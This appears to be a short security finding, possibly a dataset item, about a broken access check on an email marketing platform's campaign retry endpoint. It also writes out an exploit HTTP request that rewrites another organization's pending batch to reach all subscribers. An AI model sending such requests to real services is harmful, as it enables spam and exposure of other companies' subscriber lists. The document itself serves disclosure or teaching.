diagnosis: The campaign retry endpoint modifies queue parameters and requeues an email job identified by queue_job_id. Because it fails to check if job.organization_id == current_user.organization_id, an attacker can modify recipient filters on another company's pending email batch to broadcast spam or exfiltrate subscribers.
exploit_request:
POST /marketing/dispatch-batch/job_camp_4401/retry HTTP/1.1
Host: email.marketingsuite.com
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"new_recipient_filter": "all_subscribers"}
